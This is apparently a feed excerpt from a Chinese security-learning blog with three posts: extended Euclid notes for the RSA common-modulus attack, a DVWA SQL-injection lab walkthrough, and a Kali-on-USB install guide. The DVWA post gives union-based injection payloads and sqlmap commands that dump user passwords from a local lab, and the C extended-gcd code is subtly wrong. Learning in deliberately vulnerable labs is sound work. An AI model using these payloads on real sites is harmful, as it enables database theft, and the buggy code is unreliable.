    <id>https://mercer5.github.io/2020/08/24/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%B7%E7%AE%97%E6%B3%95%E5%8F%8A%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/</id>
    <published>2020-08-24T15:30:09.857Z</published>
    <updated>2020-08-24T15:30:09.857Z</updated>
    
    <content type="html"><![CDATA[<h1 id="欧几里德算法及扩展算法"><a href="#欧几里德算法及扩展算法" class="headerlink" title="欧几里德算法及扩展算法"></a>欧几里德算法及扩展算法</h1><h2 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h2><p>又称碾转相除法，用于计算两整数a, b 的最大公约数。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">int</span> max(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">int</span> c;</span><br><span class="line"><span class="attribute">c</span> = a % b;</span><br><span class="line"><span class="attribute">while</span> (c != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">a</span> = b;</span><br><span class="line"><span class="attribute">b</span> = c;</span><br><span class="line"><span class="attribute">c</span> = a % b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理依赖于下面定理：</p><blockquote><p>两个整数的最大公约数等于其中较小的那个数和两数相除的最大公约数。</p></blockquote><p>证明：<br>设 a = kb +r， 则r = a mod b<br>假设d为a, b的一个公约数<br>r = kb - a<br>r/d = kb/d - a/d<br>可知r/d为整数，因此d也是a, b, a%b的公约数， 则得证。</p><h2 id="欧几里得扩展算法"><a href="#欧几里得扩展算法" class="headerlink" title="欧几里得扩展算法"></a>欧几里得扩展算法</h2><p>因为在学习RSA的共模攻击，所以复习一下欧几里得算法，但是关键是欧几里得算法扩展：</p><blockquote><p>如果gcd(a, b) = c，则存在x, y，使得c = ax + by。</p></blockquote><p>证明：</p><p>　　设 <code>a&gt;b</code><br>　　当 <code>b = 0</code>时，<code>gcd(a, b) = a</code>，此时<code>x = 1</code>, <code>y = 0</code>。<br>　　假设 <code>a*x1 + b*y1 = gcd(a, b)</code><br>　　则 <code>b*x2 + (a mod b)*y2 = gcd(b, a mod b)</code><br>　　根据 <code>gcd(a, b) = gcd(b, a mod b)</code>　　<br>　　可得 <code>a*x1 + b*y1 = b*x2 + (a mod b)*y2</code>　　<br>　　因为 <code>a mod b = a - (a/b)*b</code> //这里 ‘/‘ 是整除　　<br>　　所以 <code>a*x1 + b*y1 = b*x2 + (a - (a/b)*b)*y2</code><br>　　　　　　　　　　　<code>= b*x2 + a*y2 - (a/b)*b*y2</code><br>　　　　　　 <code>gcd(a, b) = a*y2 + b*(x2 - (a/b)*y2)</code><br>　　对比 <code>a*x1 + b*y1 = gcd(a, b)</code>　　<br>　　发现 <code>x1 = y2</code><br>　　　 　 <code>y1 = x2 - (a/b)*y2</code>　　</p><p>算法代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> e<span class="constructor">_gcd(<span class="params">int</span> <span class="params">a</span>, <span class="params">int</span> <span class="params">b</span>, <span class="params">int</span> <span class="params">x</span>, <span class="params">int</span> <span class="params">y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b<span class="operator"> == </span><span class="number">0</span>)&#123;</span><br><span class="line">        x = <span class="number">1</span>;</span><br><span class="line">        y = <span class="number">0</span>;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> ans = e<span class="constructor">_gcd(<span class="params">b</span>, <span class="params">a</span>%<span class="params">b</span>, <span class="params">x</span>, <span class="params">y</span>)</span>;</span><br><span class="line">    <span class="built_in">int</span> t = x;</span><br><span class="line">    x = y;</span><br><span class="line">    y = x - (a/b)*y;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h2><p><strong>什么叫乘法逆元？</strong></p><p>形如<code>a*x mod b ≡ 1</code><br>我们称x是a关于f的乘法逆元，还有另一种表达式：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a*<span class="symbol">x</span> + b*<span class="symbol">y</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>也就是<code>gcd(a, b) = 1</code></p><p>在RSA共模攻击中，求乘法逆元函数如下</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def egcd(<span class="keyword">a</span>, b):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">a</span> == <span class="number">0</span>:</span><br><span class="line">          <span class="literal">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % <span class="keyword">a</span>, <span class="keyword">a</span>)</span><br><span class="line">        <span class="literal">return</span> (g, x - (b<span class="comment"> // a) * y, y)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;欧几里德算法及扩展算法&quot;&gt;&lt;a href=&quot;#欧几里德算法及扩展算法&quot; class=&quot;headerlink&quot; title=&quot;欧几里德算法及扩展算法&quot;&gt;&lt;/a&gt;欧几里德算法及扩展算法&lt;/h1&gt;&lt;h2 id=&quot;欧几里得算法&quot;&gt;&lt;a href=&quot;#欧几里得算法&quot; cla
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>dvwa-sql-显注-low</title>
    <link href="https://mercer5.github.io/2020/04/15/%C2%96dvwa-sql-%E6%98%BE%E6%B3%A8-low/"/>
    <id>https://mercer5.github.io/2020/04/15/%C2%96dvwa-sql-%E6%98%BE%E6%B3%A8-low/</id>
    <published>2020-04-15T09:38:31.000Z</published>
    <updated>2020-08-24T15:30:09.779Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dvwa-sql-显注-low"><a href="#dvwa-sql-显注-low" class="headerlink" title="dvwa-sql-显注-low"></a>dvwa-sql-显注-low</h1><blockquote><p>就拿dvwa学习一下sql的手工注入,以及sqlmap的使用</p><p>做些笔记</p></blockquote><h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><ol><li><p>concat_ws(1,2,3): 使用1作为连接符,连接2和3</p><p>方便从一个显示位,显示多种内容</p></li><li><p>char(32,58,32): char将其中的ascii值转成字符</p><p>这里是空格冒号空格</p><p>作为concat_ws使用,比较美观</p></li></ol><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><ol><li><p>输入<code>&#39;</code>,发现有报错,说明很可能有sql注入</p></li><li><p><code>1&#39; order by 2#</code>猜解列数</p><p>order by后面加数字时,表示按第几列进行排序</p><p>如果没有那列的话,就会报错</p><p>该步的目的,是为了使用union select</p><p>因为union select 要求两者的列数相同,才能进行查询</p><p><img src="Snipaste_2020-04-15_10-48-47.png" alt="Snipaste_2020-04-15_10-48-47"></p><p><img src="Snipaste_2020-04-15_10-48-55.png" alt="Snipaste_2020-04-15_10-48-55"></p></li><li><p><code>1&#39; union select 1,2#</code>爆显示位</p><p>从输入中,可以发现,两个都能显示出来</p><p>也就是说,每次可以查询两个地方</p><p><img src="Snipaste_2020-04-15_10-51-10.png" alt="Snipaste_2020-04-15_10-51-10"></p></li><li><p><code>1&#39; union select version(),database()#</code></p><p>查询一下sql版本和当前数据库名称</p><p>sql版本很重要,因为版本&gt;(多少我忘了&gt;&lt;)时,会有一个<code>information_schema</code>数据库,里面有好多好多好东西</p><p><img src="Snipaste_2020-04-15_10-47-58.png" alt="Snipaste_2020-04-15_10-47-58"></p><p><code>1&#39; union select null,concat_ws(char(32,58,32),user(),database(),version())#</code></p><p>另一种方法,会在第二个显示位一起爆出用户、数据库及其版本信息</p><p><img src="Snipaste_2020-04-15_16-23-32.png" alt="Snipaste_2020-04-15_16-23-32"></p></li><li><p><code>1&#39; union select null,group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; #</code></p><p>版本比较大,所以有<code>information_schema</code>;得知数据库名后,就可以查表了</p><p><img src="Snipaste_2020-04-15_16-27-26.png" alt="Snipaste_2020-04-15_16-27-26"></p><p>可以看出dvwa中有两个表<code>guestbook</code>and<code>users</code></p><p>明显users重要点,所以下一步查users的列</p></li><li><p><code>1&#39; union select null,group_concat(column_name) from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39; #</code></p><p><img src="Snipaste_2020-04-15_16-38-54.png" alt="Snipaste_2020-04-15_16-38-54"></p><p>其中<code>user</code>和<code>password</code>看起来比较重要</p></li><li><p><code>1&#39; union select null, group_concat(concat_ws(char(32,58,32),user,password)) from users #</code></p><p><img src="Snipaste_2020-04-15_16-43-02.png" alt="Snipaste_2020-04-15_16-43-02"></p></li><li><p>如果不想显示在一条上,而是分开查询的话,把group_concat删了就行</p><ul><li><p>查表</p><p><code>1&#39; union select null,table_name from information_schema.tables where table_schema=&#39;dvwa&#39; #</code></p><p><img src="Snipaste_2020-04-15_16-46-11.png" alt="Snipaste_2020-04-15_16-46-11"></p></li><li><p>查列</p><p><code>1&#39; union select null,column_name from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39; #</code></p><p><img src="Snipaste_2020-04-15_16-46-27.png" alt="Snipaste_2020-04-15_16-46-27"></p></li><li><p>查内容</p><p><code>1&#39; union select null, concat_ws(char(32,58,32),user,password) from users #</code></p><p><img src="Snipaste_2020-04-15_16-46-37.png" alt="Snipaste_2020-04-15_16-46-37"></p></li></ul></li></ol><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><ol><li><p>准备好网址</p><p>在id中输入1,是的url中包含参数名称</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/sqli/</span>?id=<span class="number">1</span>&amp;Submit=Submit<span class="comment">#</span></span><br></pre></td></tr></table></figure></li><li><p>准备好cookie</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">security</span>=low; <span class="attribute">PHPSESSID</span>=9v0e6li5s4iok70h3fi7al0gv1</span><br></pre></td></tr></table></figure></li><li><p>打开sqlmap,输入</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure><p>康康有没有sql注入</p><ul><li>-u参数指定目标URL</li><li>–batch参数采用默认选项,不进行询问</li><li>–cookie参数指定cookie</li></ul><p>可以看到是存在注入的</p><p><img src="Snipaste_2020-04-15_17-13-57.png" alt="Snipaste_2020-04-15_17-13-57"></p></li><li><p>查看所有的数据库</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span> <span class="params">--dbs</span></span><br></pre></td></tr></table></figure><ul><li>–dbs所有数据库</li></ul><p><img src="Snipaste_2020-04-15_17-15-16.png" alt="Snipaste_2020-04-15_17-15-16"></p></li><li><p>所以我们要用的应该是dvwa那个库,然后康康里面有什么表</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span> -D dvwa <span class="params">--tables</span></span><br></pre></td></tr></table></figure><ul><li>-D参数指定为dvwa数据库</li><li>–tables参数查看所有的表</li></ul><p><img src="image-20200415171817802.png" alt="image-20200415171817802"></p></li><li><p>查看users表中的列</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="attribute">--cookie</span>=<span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> --batch -D dvwa -T<span class="built_in"> users </span>--columns</span><br></pre></td></tr></table></figure><ul><li>-T参数指定表为users</li><li>–columns查看该表的所有列</li></ul><p><img src="image-20200415172014493.png" alt="image-20200415172014493"></p></li><li><p>最后看看整个表中都有什么</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="attribute">--cookie</span>=<span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> --batch -D dvwa -T<span class="built_in"> users </span>--dump</span><br></pre></td></tr></table></figure><ul><li>–dump参数将所有列的信息都列出来</li></ul><p><img src="image-20200415172329770.png" alt="image-20200415172329770"></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;dvwa-sql-显注-low&quot;&gt;&lt;a href=&quot;#dvwa-sql-显注-low&quot; class=&quot;headerlink&quot; title=&quot;dvwa-sql-显注-low&quot;&gt;&lt;/a&gt;dvwa-sql-显注-low&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;就拿dvw
      
    
    </summary>
    
    
      <category term="sql" scheme="https://mercer5.github.io/categories/sql/"/>
    
    
      <category term="sql" scheme="https://mercer5.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>带着kali一起走</title>
    <link href="https://mercer5.github.io/2020/04/10/%C2%96%E5%B8%A6%E7%9D%80kali%E4%B8%80%E8%B5%B7%E8%B5%B0/"/>
    <id>https://mercer5.github.io/2020/04/10/%C2%96%E5%B8%A6%E7%9D%80kali%E4%B8%80%E8%B5%B7%E8%B5%B0/</id>
    <published>2020-04-10T03:57:39.000Z</published>
    <updated>2020-08-24T15:30:09.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="带着kali一起走"><a href="#带着kali一起走" class="headerlink" title="带着kali一起走"></a>带着kali一起走</h1><blockquote><p>本来想装arch的来着,久仰邪教大名</p><p><code>┏┛墓┗┓...(((m -__-)m</code>,不愧是邪教</p><p>ubuntu也搞了好久,但是没成功</p><p>所以在kali这碰碰运气</p><p>没想到啊,除了一点小问题,竟然成功了</p><p>这里贴上我参考的blog: <a href="https://blog.51cto.com/zdzhu/1574543" target="_blank" rel="noopener">https://blog.51cto.com/zdzhu/1574543</a></p><p>下面,就大致记录一下过程,以及问题的解决</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li>kali镜像: 墙裂建议<a href="https://mirror.tuna.tsinghua.edu.cn/" target="_blank" rel="noopener">清华镜像站</a></li><li>vm: 去官网找一下吧,我的是15的</li><li>U盘: 我用的是SanDisk32G的</li></ol><h2 id="U盘的处理"><a href="#U盘的处理" class="headerlink" title="U盘的处理"></a>U盘的处理</h2><blockquote><p>这是我自己瞎鼓捣出来的,所以我不确定有什么后果,虽然最终是成功了的</p></blockquote><h3 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h3><p>就在我愉快的进行到最后一步时</p><p><strong>在SCSI3(0,0,0)(sda)设备的第1分区上创建ext4文件系统失败</strong></p><p>To be continue……</p><p>然后,我寻思着,整个安装过程都没什么我可以瞎几把乱点的地方</p><p>然后我看看因为装arch,装ubuntu,格式化了2次的U盘</p><p>再看看报错说: 创建ext4<strong>文件系统</strong>失败</p><p>在格式化U盘时,一直是默认的fat32<strong>文件系统</strong></p><p>我觉得我可以换一种试试,比如<strong>exfat</strong></p><p>然后意外的成了!!!</p><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><ol><li><p>此电脑</p></li><li><p>在U盘处右键,选择<strong>格式化</strong></p><p><img src="Snipaste_2020-04-10_00-17-37.png" alt="Snipaste_2020-04-10_00-17-37"></p></li><li><p>设置文件系统为<strong>exfat</strong></p><p><img src="Snipaste_2020-04-09_16-30-27.png" alt="Snipaste_2020-04-09_16-30-27"></p></li></ol><h2 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h2><ol><li><p>创建新的虚拟机,选择典型</p><p><img src="Snipaste_2020-04-09_16-13-27.png" alt="Snipaste_2020-04-09_16-13-27"></p></li><li><p>选第二个,浏览找到你所下载的镜像文件</p><p><img src="Snipaste_2020-04-09_16-14-15.png" alt="Snipaste_2020-04-09_16-14-15"></p></li><li><p>linux,版本我就乱选了&gt;&lt;</p><p><img src="Snipaste_2020-04-09_16-14-59.png" alt="Snipaste_2020-04-09_16-14-59"></p></li><li><p>你可以给你的虚拟机取一个好听的名字,放在一个你能找到的位置</p><p>毕竟它命不久矣</p><p><img src="Snipaste_2020-04-09_16-16-04.png" alt="Snipaste_2020-04-09_16-16-04"></p></li><li><p>分配磁盘空间,这里可以乱搞</p><p><img src="Snipaste_2020-04-09_16-17-46.png" alt="Snipaste_2020-04-09_16-17-46"></p></li><li><p>这样就好了</p></li></ol><h2 id="虚拟机的配置"><a href="#虚拟机的配置" class="headerlink" title="虚拟机的配置"></a>虚拟机的配置</h2><ol><li>单击“编辑虚拟机设置”</li></ol><p><img src="wKioL1Re6FvyXY59AAEB5AV5vKQ372.jpg" alt="wKioL1Re6FvyXY59AAEB5AV5vKQ372.jpg"></p><ol start="2"><li>选择硬盘，然后单击下面的“移除”，然后单击“确定”。</li></ol><p><img src="wKioL1Re6FuCaDs7AAGWORRZME8348.jpg" alt="wKioL1Re6FuCaDs7AAGWORRZME8348.jpg"></p><h2 id="装系统进U盘"><a href="#装系统进U盘" class="headerlink" title="装系统进U盘"></a>装系统进U盘</h2><blockquote><p>这里我是粘贴了上面记载的博客的内容</p><p>然后针对我和他不一样的地方进行注释</p></blockquote><ol><li>将U盘或者移动硬盘插到PC上</li><li>在Vmware中运行刚刚创建后的虚拟机。</li><li>虚拟机运行后单击右下角的移动设备挂载按键，如下红色框所示。</li></ol><p><img src="wKiom1Re7Nyx59VvAAFjcAthyVE334.jpg" alt="wKiom1Re7Nyx59VvAAFjcAthyVE334.jpg"></p><ol start="4"><li>选择如下红框内容。</li></ol><p><img src="wKioL1Re7WPAvHOOAABTGEcUUw0628.jpg" alt="wKioL1Re7WPAvHOOAABTGEcUUw0628.jpg"></p><ol start="5"><li>在下面弹出的对话框中单击确定，此时移动设备会挂载到虚拟机下，Windows下将暂时看不到这个设备。</li></ol><p><img src="wKioL1Re7bbw08-aAACk6_CZoaE473.jpg" alt="wKioL1Re7bbw08-aAACk6_CZoaE473.jpg"></p><ol start="6"><li>选择图形化安装Kali。然后按回车键。</li></ol><p><img src="wKioL1Re7gvwAJPEAAECKN4L6LY399.jpg" alt="wKioL1Re7gvwAJPEAAECKN4L6LY399.jpg"></p><ol start="7"><li>步骤6结束后会让你选择系统语言、键盘语言、主机名、root密码等</li></ol><hr><p><strong>注意!!!</strong></p><p>第7步,键盘语言,务必选择<strong>英语(美国)</strong></p><p>我好像选错了,选成英语(英国)了,结果有些按键对不上</p><p>eg:<code>@</code>—&gt;<code>&quot;</code>,<code>&quot;</code>—&gt;<code>@</code>, <code>#</code>—&gt;一个我打不出来的东西</p><p>如果选错了,可以拉到下面的<strong>问题</strong>处</p><p>第8步,我的和那个博客的大佬的不大一样,没有第一个选项</p><p>所以直接使用默认,即<strong>向导 - 使用整个磁盘</strong></p><hr><ol start="8"><li>设置完root密码后，安装界面最后会停到“磁盘分区”界面如下。这里建议选择默认“使用最多的连续空闲空间”。然后单击继续。</li></ol><p><img src="wKiom1Re7aSwR1oeAAEn-52ZjS4680.jpg" alt="wKiom1Re7aSwR1oeAAEn-52ZjS4680.jpg"></p><ol start="9"><li>这里会发现你的移动设备被扫描到了。建议大家选择“将所有文件放在一个分区中”。</li></ol><p><img src="wKioL1Re7gyiUZ0AAAENvyGLgoI864.jpg" alt="wKioL1Re7gyiUZ0AAAENvyGLgoI864.jpg"></p><ol start="10"><li>系统会自动给您创建一个分区，如下。选择“分区设定结束并将修改写入磁盘”。此时正式的安全就开始了。时间估计在20分钟左右。</li></ol><p>在此过程中还会让设置几个选项，一个是“网络镜像”建议选否，一个是“将GRUB启动引导器安装到主引导记录（MBR）上，一定选“是”。</p><p><img src="wKiom1Re7aTBw8A3AAE_Gi5OlLc587.jpg" alt="wKiom1Re7aTBw8A3AAE_Gi5OlLc587.jpg"></p><ol start="11"><li>安装完成后单击“继续”此时系统会重启，由于Vmware重启后不会自动挂载移动设备，所以无法进入到刚刚安装完毕的系统中。不过此时已经不重要了，因为系统已经安装到移动设备中。单击“关闭客户机”关闭虚拟机。然后拔下移动硬盘或者U盘，快去重启PC然后选择USB启动试试，看看是否OK！</li></ol><p><img src="wKioL1Re7gzgKrOGAAC7YqvuJ7o544.jpg" alt="wKioL1Re7gzgKrOGAAC7YqvuJ7o544.jpg"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote><p>贴上自己的使用经历</p><p>如果不放心的话,可以先选择虚拟机那个</p><p>毕竟”虚拟机”,听着就很安全: )</p></blockquote><h3 id="电脑"><a href="#电脑" class="headerlink" title="电脑"></a>电脑</h3><hr><p>自己的电脑舍不得用,所以把家里的超级老电脑(ThinkPad)搬了出来</p><ol><li><p>开机</p></li><li><p>狂按f12</p></li><li><p>选择usb</p></li><li><p>然后等就行了</p></li></ol><p>这一等就是五六分钟……我都在自己笔记本上开始搜: U盘启动系统卡在初始页面咋办</p><p>不知道是电脑老还是系统在U盘里的原因,开机速度很慢,</p><p>使用的话,比那台老电脑使用win7的时候好点,这是不是说明,我用一台好电脑就行了?</p><hr><p>emmm,试了一下我自己的笔记本(Asus),哇,简直了</p><p>我本来以为和老机一样,直接就可以进了,没想到从f2/esc/f7/f8/f12,tmd一个个按了个遍</p><p>就是没找到U盘启动项在哪里&gt;&lt;</p><ol><li>第一次使用的小伙伴要开机按<strong>f2</strong>进入bios</li><li>进入<strong>security</strong>选项卡,<strong>security boot menu</strong>,然后点击<strong>secure boot control</strong>,把改为<strong>disabled</strong></li><li>进入<strong>boot</strong>选项卡,把<strong>CSM</strong>的什么东西(全称记不住了,反正只有一个),改为<strong>enable</strong></li><li><strong>f10</strong>保存退出</li><li>开机按<strong>f12</strong>进入选择启动项,这时候就有别的选项了,选择自己的U盘,ojbk</li></ol><p>开机比上面的老电脑好多了,至少不会有种完了进不去了的感觉</p><p>使用速度确实比较慢,U盘还是限制了发挥</p><hr><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><ol><li><p>新建虚拟机,选择自定义</p><p><img src="Snipaste_2020-04-09_18-05-06.png" alt="Snipaste_2020-04-09_18-05-06"></p></li><li><p>过</p><p><img src="Snipaste_2020-04-09_18-05-14.png" alt="Snipaste_2020-04-09_18-05-14"></p></li><li><p>稍后安装操作系统</p><p><img src="Snipaste_2020-04-09_18-05-31.png" alt="Snipaste_2020-04-09_18-05-31"></p></li><li><p>取名和选择版本(随便啦)</p><p><img src="Snipaste_2020-04-09_18-05-35.png" alt="Snipaste_2020-04-09_18-05-35"></p></li><li><p>名称位置(还是随便)</p><p><img src="Snipaste_2020-04-09_18-06-18-1586430144451.png" alt="Snipaste_2020-04-09_18-06-18"></p></li><li><p>使用物理磁盘</p><p><img src="Snipaste_2020-04-09_18-06-42.png" alt="Snipaste_2020-04-09_18-06-42"></p></li><li><p>选择自己U盘的那个设备</p><p><img src="Snipaste_2020-04-09_18-06-49.png" alt="Snipaste_2020-04-09_18-06-49"></p></li><li><p>后面就没啥了</p></li></ol><p>虚拟机是在我的电脑中开的,很流畅,说明确实是电脑问题</p><p>不过开机和我直接装在虚拟机上的kali比,慢了不少</p><p>日常使用,emmm,用的不多还没感受出来</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>记录我在配置kali时遇到的问题</p></blockquote><h3 id="键盘映射有问题"><a href="#键盘映射有问题" class="headerlink" title="键盘映射有问题"></a>键盘映射有问题</h3><ol><li><p>打开设置界面</p><p><img src="Snipaste_2020-04-09_19-07-45.png" alt="Snipaste_2020-04-09_19-07-45"></p></li></ol><ol start="2"><li><p>键盘</p><p><img src="Snipaste_2020-04-09_19-07-59.png" alt="Snipaste_2020-04-09_19-07-59"></p></li></ol><ol start="3"><li><p>在布局中,加入英语(美国),移到最上面,其他删了还是放着随意</p><p><img src="Snipaste_2020-04-09_19-08-32.png" alt="Snipaste_2020-04-09_19-08-32"></p></li><li><p>记得重启</p></li></ol><h3 id="command-not-found"><a href="#command-not-found" class="headerlink" title="command not found"></a>command not found</h3><p>就在弄上面的键盘时,用到了重启</p><p>所以我试着输入了<code>reboot</code></p><p>oho,没用</p><ol><li><code>echo $PATH</code> 查看一下,路径里有啥,确实没有/sbin</li><li><code>export PATH=$PATH:$HOME/bin:/sbin:/usr/bin:/usr/sbin</code> 增加一些路径</li></ol><p>因为路径里存放着,我们所用到的命令</p><p>从本质上来说,我们所使用的命令就是一个个程序,他们被存放在某个地方</p><p>我们在终端中使用命令时,会从路径中找到那个程序</p><p>我们的情况就是,我们没告诉他路径是什么,所以他找不到</p><p>因此,如果我们知到放在哪里,就可以直接去使用</p><p>eg: <code>reboot</code> 在<code>/sbin</code> 里,所以我们可以使用<code>/sbin/reboot</code> 来重启</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><blockquote><p>一些方便使用的,提升使用舒适度的小tip</p></blockquote><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p>ctrl+alt+t 打开终端</p><p>halt 关机</p><p>reboot 重启</p><h3 